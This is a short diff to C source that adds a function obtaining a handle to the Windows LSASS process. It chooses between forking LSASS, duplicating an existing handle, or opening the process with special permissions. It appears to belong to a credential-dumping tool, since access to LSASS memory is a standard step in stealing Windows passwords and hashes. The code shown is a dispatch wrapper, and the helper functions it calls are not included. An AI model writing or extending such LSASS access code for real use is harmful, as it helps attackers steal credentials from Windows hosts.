@@ -1,6 +1,45 @@
 #include "../include/handle.h"
 #include "../include/modules.h"
 
+HANDLE obtain_lsass_handle(
+    DWORD pid,
+    BOOL fork,
+    BOOL dup
+)
+{
+    HANDLE hProcess;
+    if (pid)
+    {
+        if (fork)
+        {
+            hProcess = fork_lsass_process(
+                pid
+            );
+        }
+        else if (dup)
+        {
+            hProcess = duplicate_lsass_handle(
+                pid
+            );
+        }
+        else
+        {
+            hProcess = get_process_handle(
+                pid,
+                LSASS_PERMISSIONS,
+                FALSE
+            );
+        }
+    }
+    else
+    {
+        hProcess = find_lsass(
+            LSASS_PERMISSIONS
+        );
+    }
+    return hProcess;
+}
+
 HANDLE get_process_handle(
     DWORD dwPid,
     DWORD dwFlags,
